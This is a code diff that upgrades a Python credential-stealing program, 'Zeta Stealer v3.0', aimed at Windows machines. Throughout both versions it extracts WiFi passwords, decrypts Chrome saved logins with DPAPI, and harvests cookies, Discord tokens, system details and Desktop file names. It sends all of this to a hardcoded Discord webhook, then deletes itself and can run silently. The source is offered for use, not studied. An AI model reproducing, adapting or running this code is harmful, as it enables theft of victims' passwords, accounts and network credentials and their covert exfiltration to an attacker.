@@ -1,369 +1,403 @@
+#!/usr/bin/env python3
+"""
+Zeta Minimal Stealer v3.0
+No external dependencies required
+"""
+
 import os
 import sys
 import json
 import sqlite3
 import base64
 import shutil
-import struct
 import winreg
-import hashlib
-import hmac
 import subprocess
 import platform
 import socket
 import getpass
 import time
 import urllib.request
-import urllib.parse
+import urllib.error
 import tempfile
 import ctypes
 import ctypes.wintypes
-from datetime import datetime, timedelta
+import zipfile
+import re
 
-# Your Discord webhook
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1446630967832744037/S0e26cEzguLQFxnIDd48A_qW9L3ZgBlYPiIZD_m-IyIWtCz85kUxjZiojzbXBXbfKvMq"
+# ========== CONFIG ==========
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1446690566619267164/-8tbSKNp06zjEr5efF6xS8mRNLts_f1TnoqZqLF-oVhR12UCn2-sixp3yd7mNR-q5VuQ"
+ENABLE_SELF_DESTRUCT = True
+# ============================
 
-
-# DPAPI decryption for Chrome passwords
-class CryptUnprotectData:
-    def __init__(self):
-        self.crypt = ctypes.windll.crypt32
-        self.LocalFree = ctypes.windll.kernel32.LocalFree
-
-    def decrypt(self, cipher_text):
-        blob_in = ctypes.create_string_buffer(cipher_text)
-        blob_in_size = len(cipher_text)
-        blob_out = ctypes.POINTER(ctypes.c_byte)()
-        blob_out_size = ctypes.c_ulong()
-
-        if self.crypt.CryptUnprotectData(
-                blob_in, None, None, None, None, 0,
-                ctypes.byref(blob_out),
-                ctypes.byref(blob_out_size)):
-            data = ctypes.string_at(blob_out, blob_out_size.value)
-            self.LocalFree(blob_out)
-            return data.decode('utf-8')
-        return None
-
-
-def run_cmd(cmd):
+def run_cmd(cmd, timeout=10):
+    """Execute command and return output"""
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+        result = subprocess.run(
+            cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+        )
         return result.stdout + result.stderr
     except:
         return ""
 
+class ChromeStealer:
+    """Steal Chrome data (Windows only)"""
+    @staticmethod
+    def decrypt_password(encrypted_password):
+        """Decrypt Chrome password using DPAPI"""
+        try:
+            crypt32 = ctypes.windll.crypt32
+            kernel32 = ctypes.windll.kernel32
 
-def get_system_info():
-    info = "=== SYSTEM INFORMATION ===\n"
-    info += f"Computer: {socket.gethostname()}\n"
-    info += f"User: {getpass.getuser()}\n"
-    info += f"OS: {platform.platform()}\n"
-    info += f"Architecture: {platform.architecture()[0]}\n"
-    info += f"Time: {time.ctime()}\n\n"
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", ctypes.wintypes.DWORD),
+                            ("pbData", ctypes.POINTER(ctypes.c_char))]
 
-    info += "=== IP CONFIG ===\n"
-    info += run_cmd("ipconfig /all") + "\n"
+            in_blob = DATA_BLOB()
+            out_blob = DATA_BLOB()
 
-    info += "=== SYSTEMINFO ===\n"
-    info += run_cmd("systeminfo")[:3000] + "\n"
+            in_blob.pbData = ctypes.c_char_p(encrypted_password)
+            in_blob.cbData = len(encrypted_password)
 
-    info += "=== USER ACCOUNTS ===\n"
-    info += run_cmd("net user") + "\n"
+            if crypt32.CryptUnprotectData(
+                    ctypes.byref(in_blob), None, None, None, None, 0,
+                    ctypes.byref(out_blob)):
 
-    return info
+                decrypted = ctypes.string_at(out_blob.pbData, out_blob.cbData)
+                kernel32.LocalFree(out_blob.pbData)
+                return decrypted.decode('utf-8', errors='ignore')
+        except:
+            pass
+        return None
 
+def collect_system_info():
+    """Collect system information"""
+    data = "╔══════════════════════════════════════════╗\n"
+    data += "║         SYSTEM INFORMATION              ║\n"
+    data += "╚══════════════════════════════════════════╝\n\n"
 
-def get_wifi_passwords():
-    wifi_data = "=== WIFI PASSWORDS ===\n"
+    # Basic info
+    data += f"Computer: {socket.gethostname()}\n"
+    data += f"User: {getpass.getuser()}\n"
+    data += f"OS: {platform.platform()}\n"
+    data += f"Architecture: {platform.architecture()[0]}\n"
+    data += f"Time: {time.ctime()}\n\n"
+
+    # Windows specific
+    if sys.platform == "win32":
+        # System info
+        sysinfo = run_cmd("systeminfo")
+        if sysinfo:
+            data += "=== SYSTEMINFO ===\n"
+            data += sysinfo[:1500] + "\n\n"
+
+        # Network info
+        netinfo = run_cmd("ipconfig /all")
+        if netinfo:
+            data += "=== NETWORK ===\n"
+            data += netinfo[:1000] + "\n\n"
+
+        # Users
+        users = run_cmd("net user")
+        if users:
+            data += "=== USERS ===\n"
+            data += users[:500] + "\n\n"
+
+    return data
+
+def collect_wifi_passwords():
+    """Collect WiFi passwords (Windows only)"""
+    data = "╔══════════════════════════════════════════╗\n"
+    data += "║         WIFI PASSWORDS                  ║\n"
+    wifi += "╚══════════════════════════════════════════╝\n\n"
+
+    if sys.platform != "win32":
+        data += "WiFi extraction only available on Windows\n"
+        return data
+
     try:
         profiles = run_cmd("netsh wlan show profiles")
+        if not profiles:
+            data += "No WiFi profiles found\n"
+            return data
+
         for line in profiles.split('\n'):
             if "All User Profile" in line:
-                profile = line.split(":")[1].strip()
-                info = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
-                for pass_line in info.split('\n'):
-                    if "Key Content" in pass_line:
-                        password = pass_line.split(":")[1].strip()
-                        wifi_data += f"SSID: {profile} | Password: {password}\n"
-                        break
-    except:
-        wifi_data += "Failed to get WiFi passwords\n"
-    return wifi_data
+                try:
+                    profile = line.split(":")[1].strip()
+                    details = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
 
+                    password = "Not found"
+                    for detail_line in details.split('\n'):
+                        if "Key Content" in detail_line:
+                            password = detail_line.split(":")[1].strip()
+                            break
 
-def get_discord_tokens():
-    tokens_data = "=== DISCORD TOKENS ===\n"
-    discord_paths = [
-        os.path.join(os.environ['LOCALAPPDATA'], 'Discord'),
-        os.path.join(os.environ['LOCALAPPDATA'], 'DiscordCanary'),
-        os.path.join(os.environ['LOCALAPPDATA'], 'DiscordPTB'),
-        os.path.join(os.environ['APPDATA'], 'Discord'),
-        os.path.join(os.environ['APPDATA'], 'DiscordCanary'),
-        os.path.join(os.environ['APPDATA'], 'DiscordPTB')
-    ]
+                    data += f"SSID: {profile}\nPassword: {password}\n\n"
+                except:
+                    data += f"SSID: {profile} (Error)\n"
+    except Exception as e:
+        data += f"Error: {str(e)}\n"
 
-    for discord_path in discord_paths:
-        if os.path.exists(discord_path):
-            leveldb_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
-            if os.path.exists(leveldb_path):
-                tokens_data += f"\nChecking Discord at: {discord_path}\n"
+    return data
 
-                # Look for token files
-                for file in os.listdir(leveldb_path):
-                    if file.endswith('.ldb') or file.endswith('.log'):
-                        file_path = os.path.join(leveldb_path, file)
-                        try:
-                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                content = f.read()
-                                # Look for tokens in the content
-                                if 'token' in content.lower() or 'mfa.' in content:
-                                    tokens_data += f"Found token file: {file}\n"
-                                    # Extract potential tokens
-                                    lines = content.split('\n')
-                                    for line in lines:
-                                        if 'token' in line.lower() and len(line) < 200:
-                                            tokens_data += f"  Possible token: {line.strip()}\n"
-                        except:
-                            continue
+def collect_browser_data():
+    """Collect browser data"""
+    data = "╔══════════════════════════════════════════╗\n"
+    data += "║         BROWSER DATA                    ║\n"
+    data += "╚══════════════════════════════════════════╝\n\n"
 
-    # Also check Local State file for encrypted tokens
-    for discord_path in discord_paths:
-        local_state_path = os.path.join(discord_path, 'Local State')
-        if os.path.exists(local_state_path):
-            try:
-                with open(local_state_path, 'r') as f:
-                    local_state = json.load(f)
-                    tokens_data += f"\nLocal State found at: {discord_path}\n"
-                    if 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
-                        tokens_data += "Found encrypted key in Local State\n"
-            except:
-                pass
-
-    if tokens_data == "=== DISCORD TOKENS ===\n":
-        tokens_data += "No Discord tokens found\n"
-
-    return tokens_data
-
-
-def get_chrome_passwords():
-    passwords_data = "=== CHROME PASSWORDS ===\n"
+    if sys.platform != "win32":
+        data += "Browser data extraction only available on Windows\n"
+        return data
 
     # Chrome paths
     chrome_paths = [
-        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
-        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Profile 1', 'Login Data'),
-        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Profile 2', 'Login Data'),
+        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default'),
+        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome Beta', 'User Data', 'Default'),
     ]
 
-    for login_db in chrome_paths:
-        if os.path.exists(login_db):
-            try:
-                # Copy the database to temp location (Chrome locks it)
-                temp_db = os.path.join(tempfile.gettempdir(), 'chrome_login_data.db')
-                shutil.copy2(login_db, temp_db)
+    for chrome_path in chrome_paths:
+        if os.path.exists(chrome_path):
+            data += f"\n=== CHROME ({chrome_path}) ===\n"
 
-                conn = sqlite3.connect(temp_db)
-                cursor = conn.cursor()
+            # Cookies
+            cookies_db = os.path.join(chrome_path, 'Cookies')
+            if os.path.exists(cookies_db):
+                try:
+                    temp_db = os.path.join(tempfile.gettempdir(), 'cookies_temp.db')
+                    shutil.copy2(cookies_db, temp_db)
 
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
 
-                for row in cursor.fetchall():
-                    url, username, encrypted_password = row
-                    if username and encrypted_password:
-                        # Try to decrypt the password
-                        try:
-                            decrypted = CryptUnprotectData().decrypt(encrypted_password)
+                    # Get important cookies
+                    cursor.execute("SELECT host_key, name FROM cookies WHERE host_key LIKE '%discord%' OR host_key LIKE '%google%' LIMIT 10")
+                    cookies = cursor.fetchall()
+
+                    if cookies:
+                        data += "Important cookies found:\n"
+                        for host, name in cookies:
+                            data += f"  {host}: {name}\n"
+
+                    conn.close()
+                    os.remove(temp_db)
+                except:
+                    pass
+
+            # Passwords
+            login_db = os.path.join(chrome_path, 'Login Data')
+            if os.path.exists(login_db):
+                try:
+                    temp_logins = os.path.join(tempfile.gettempdir(), 'logins_temp.db')
+                    shutil.copy2(login_db, temp_logins)
+
+                    conn = sqlite3.connect(temp_logins)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 5")
+
+                    stealer = ChromeStealer()
+                    for url, user, enc_pass in cursor.fetchall():
+                        if user:
+                            decrypted = stealer.decrypt_password(enc_pass)
                             if decrypted:
-                                passwords_data += f"URL: {url}\n"
-                                passwords_data += f"  Email/Username: {username}\n"
-                                passwords_data += f"  Password: {decrypted}\n\n"
-                        except:
-                            passwords_data += f"URL: {url}\n"
-                            passwords_data += f"  Email/Username: {username}\n"
-                            passwords_data += f"  Password: [Encrypted - decryption failed]\n\n"
+                                data += f"Login: {url}\n"
+                                data += f"  User: {user}\n"
+                                data += f"  Pass: {decrypted}\n"
 
-                conn.close()
-                os.remove(temp_db)
+                    conn.close()
+                    os.remove(temp_logins)
+                except:
+                    pass
 
-            except Exception as e:
-                passwords_data += f"Error reading Chrome passwords: {str(e)}\n"
+    return data
 
-    if passwords_data == "=== CHROME PASSWORDS ===\n":
-        passwords_data += "No Chrome passwords found or Chrome not installed\n"
+def collect_discord_tokens():
+    """Collect Discord tokens"""
+    data = "╔══════════════════════════════════════════╗\n"
+    data += "║         DISCORD TOKENS                  ║\n"
+    data += "╚══════════════════════════════════════════╝\n\n"
 
-    return passwords_data
-
-
-def get_browser_cookies():
-    cookies_data = "=== BROWSER COOKIES ===\n"
-
-    # Check for Chrome cookies
-    chrome_cookie_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
-    if os.path.exists(chrome_cookie_path):
-        try:
-            temp_cookies = os.path.join(tempfile.gettempdir(), 'chrome_cookies.db')
-            shutil.copy2(chrome_cookie_path, temp_cookies)
-
-            conn = sqlite3.connect(temp_cookies)
-            cursor = conn.cursor()
-
-            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
-
-            for host, name, value in cursor.fetchall():
-                if 'discord' in host or 'google' in host or 'facebook' in host:
-                    cookies_data += f"Site: {host} | Cookie: {name} = {value[:50]}\n"
-
-            conn.close()
-            os.remove(temp_cookies)
-        except:
-            cookies_data += "Could not read Chrome cookies\n"
-
-    return cookies_data
-
-
-def get_installed_software():
-    software_data = "=== INSTALLED SOFTWARE ===\n"
-    try:
-        # Check registry for installed software
-        reg_paths = [
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
-            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+    discord_paths = []
+    if sys.platform == "win32":
+        discord_paths = [
+            os.path.join(os.environ['LOCALAPPDATA'], 'Discord'),
+            os.path.join(os.environ['LOCALAPPDATA'], 'DiscordCanary'),
         ]
+    elif sys.platform == "darwin":
+        discord_paths = [os.path.expanduser('~/Library/Application Support/discord')]
+    else:
+        discord_paths = [os.path.expanduser('~/.config/discord')]
 
-        for reg_path in reg_paths:
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
-                i = 0
-                while True:
-                    try:
-                        subkey_name = winreg.EnumKey(key, i)
-                        subkey = winreg.OpenKey(key, subkey_name)
+    for discord_path in discord_paths:
+        if os.path.exists(discord_path):
+            data += f"\nChecking: {discord_path}\n"
 
+            # Look for Local Storage
+            leveldb = os.path.join(discord_path, 'Local Storage', 'leveldb')
+            if os.path.exists(leveldb):
+                for file in os.listdir(leveldb)[:5]:
+                    if file.endswith('.ldb') or file.endswith('.log'):
                         try:
-                            display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
-                            display_version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if \
-                            winreg.QueryValueEx(subkey, "DisplayVersion")[1] == 1 else ""
-                            software_data += f"{display_name} {display_version}\n"
+                            with open(os.path.join(leveldb, file), 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
+                                for token in tokens[:3]:
+                                    data += f"  Token: {token}\n"
                         except:
                             pass
 
-                        winreg.CloseKey(subkey)
-                        i += 1
-                    except OSError:
-                        break
-                winreg.CloseKey(key)
-            except:
-                pass
-    except:
-        software_data += "Could not read installed software\n"
+    return data
 
-    return software_data[:2000]  # Limit size
+def collect_file_list():
+    """List important files"""
+    data = "╔══════════════════════════════════════════╗\n"
+    data += "║         FILE LIST                       ║\n"
+    data += "╚══════════════════════════════════════════╝\n\n"
 
+    # Desktop files
+    desktop = ""
+    if sys.platform == "win32":
+        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+    else:
+        desktop = os.path.expanduser('~/Desktop')
 
-def send_to_discord(data, filename="system_report.txt"):
+    if os.path.exists(desktop):
+        data += "Desktop files:\n"
+        files = os.listdir(desktop)[:10]
+        for file in files:
+            path = os.path.join(desktop, file)
+            if os.path.isfile(path):
+                size = os.path.getsize(path) / 1024
+                data += f"  {file} ({size:.1f} KB)\n"
+
+    return data
+
+def send_to_discord_simple(data, filename="system_data.txt"):
+    """Send data to Discord webhook - SIMPLE METHOD"""
+    if WEBHOOK_URL == "YOUR_WEBHOOK_HERE":
+        print("[!] No webhook configured")
+        return False
+
     try:
-        # Create boundary
-        boundary = "----WebKitFormBoundary" + "".join([str(i) for i in range(10)])
+        # Method 1: Send as JSON message (works for small data)
+        if len(data) < 1500:
+            payload = {
+                "content": f"🔓 **ZETA STEALER** - `{socket.gethostname()}`\n```{data}```",
+                "username": f"{getpass.getuser()}"
+            }
+            req = urllib.request.Request(
+                WEBHOOK_URL,
+                data=json.dumps(payload).encode('utf-8'),
+                headers={'Content-Type': 'application/json'}
+            )
+            urllib.request.urlopen(req, timeout=10)
+            return True
 
-        # Build the body
+        # Method 2: Send as file (for larger data)
+        # Create boundary
+        boundary = '----WebKitFormBoundary' + str(int(time.time()))
+
+        # Build body
         body = []
         body.append(f'--{boundary}')
         body.append('Content-Disposition: form-data; name="content"')
         body.append('')
-        body.append('🔓 SYSTEM COMPROMISED - Complete Data Exfiltration')
+        body.append(f'🔓 **ZETA STEALER** - `{socket.gethostname()}` - `{getpass.getuser()}`')
+
         body.append(f'--{boundary}')
         body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
         body.append('Content-Type: text/plain')
         body.append('')
         body.append(data)
+
         body.append(f'--{boundary}--')
         body.append('')
 
         body_bytes = '\r\n'.join(body).encode('utf-8')
 
-        # Create request
         req = urllib.request.Request(WEBHOOK_URL, data=body_bytes)
         req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
         req.add_header('User-Agent', 'Mozilla/5.0')
 
-        # Send
-        urllib.request.urlopen(req, timeout=30)
-
-        # Send success message
-        payload = {"content": "✅ Data exfiltration completed successfully!"}
-        data_bytes = json.dumps(payload).encode('utf-8')
-        req2 = urllib.request.Request(WEBHOOK_URL, data=data_bytes, headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req2, timeout=10)
-
+        urllib.request.urlopen(req, timeout=15)
         return True
-    except Exception as e:
-        # Simple fallback
+
+    except urllib.error.HTTPError as e:
+        print(f"[!] HTTP Error: {e.code} - {e.reason}")
+        # Try fallback method
         try:
-            payload = {"content": f"🔓 SYSTEM DATA (Partial)\n```{data[:1500]}```"}
-            data_bytes = json.dumps(payload).encode('utf-8')
-            req = urllib.request.Request(WEBHOOK_URL, data=data_bytes, headers={'Content-Type': 'application/json'})
+            # Send minimal data
+            minimal = f"Host: {socket.gethostname()}\nUser: {getpass.getuser()}\n"
+            payload = {"content": f"🔓 ZETA STEALER\n```{minimal}```"}
+            req = urllib.request.Request(
+                WEBHOOK_URL,
+                data=json.dumps(payload).encode('utf-8'),
+                headers={'Content-Type': 'application/json'}
+            )
             urllib.request.urlopen(req, timeout=10)
+            return True
         except:
-            pass
+            return False
+    except Exception as e:
+        print(f"[!] Send error: {str(e)}")
         return False
 
-
 def main():
-    # Collect all data
-    all_data = "╔══════════════════════════════════════╗\n"
-    all_data += "║    COMPLETE SYSTEM EXFILTRATION     ║\n"
-    all_data += "╚══════════════════════════════════════╝\n\n"
+    """Main function"""
+    print("[*] Zeta Stealer v3.0 - Starting...")
 
-    all_data += get_system_info()
-    all_data += get_wifi_passwords()
-    all_data += "\n"
-    all_data += get_discord_tokens()
-    all_data += "\n"
-    all_data += get_chrome_passwords()
-    all_data += "\n"
-    all_data += get_browser_cookies()
-    all_data += "\n"
-    all_data += get_installed_software()
-
-    # Add desktop files list
-    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
-    if os.path.exists(desktop):
-        all_data += "\n=== DESKTOP FILES ===\n"
-        try:
-            for item in os.listdir(desktop)[:20]:  # Limit to 20 files
-                item_path = os.path.join(desktop, item)
-                if os.path.isfile(item_path):
-                    size = os.path.getsize(item_path) / 1024
-                    all_data += f"{item} ({size:.1f} KB)\n"
-        except:
-            all_data += "Could not list desktop files\n"
-
-    # Add clipboard content (if possible)
+    # Collect data
+    all_data = ""
     try:
-        import win32clipboard
-        win32clipboard.OpenClipboard()
-        clipboard_data = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
-        if clipboard_data and len(clipboard_data) < 1000:
-            all_data += f"\n=== CLIPBOARD CONTENT ===\n{clipboard_data}\n"
-    except:
-        pass
+        all_data += collect_system_info()
+        all_data += "\n" + collect_wifi_passwords()
+        all_data += "\n" + collect_browser_data()
+        all_data += "\n" + collect_discord_tokens()
+        all_data += "\n" + collect_file_list()
+    except Exception as e:
+        all_data += f"\nError during collection: {str(e)}\n"
 
     # Send to Discord
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"system_report_{socket.gethostname()}_{timestamp}.txt"
+    if WEBHOOK_URL != "YOUR_WEBHOOK_HERE":
+        print("[*] Sending data to Discord...")
+        if send_to_discord_simple(all_data):
+            print("[✓] Data sent successfully")
+        else:
+            print("[!] Failed to send data")
+    else:
+        print("[!] No webhook configured")
+        # Save to file for debugging
+        try:
+            with open('debug_loot.txt', 'w', encoding='utf-8') as f:
+                f.write(all_data)
+            print("[✓] Data saved to debug_loot.txt")
+        except:
+            pass
 
-    success = send_to_discord(all_data, filename)
+    # Self-destruct
+    if ENABLE_SELF_DESTRUCT:
+        try:
+            # Wait a bit then delete
+            time.sleep(2)
+            os.remove(sys.argv[0])
+            print("[✓] Self-destruct completed")
+        except:
+            print("[!] Could not self-destruct")
 
-    # Clean up - delete this script
-    try:
-        os.remove(sys.argv[0])
-    except:
-        pass
-
-    return success
-
+    # Keep console open if double-clicked
+    if len(sys.argv) == 1:  # No arguments
+        input("\nPress Enter to exit...")
 
 if __name__ == "__main__":
+    # Handle silent mode
+    if len(sys.argv) > 1 and sys.argv[1] == "--silent":
+        # Redirect output to null
+        sys.stdout = open(os.devnull, 'w')
+        sys.stderr = open(os.devnull, 'w')
+
     main()
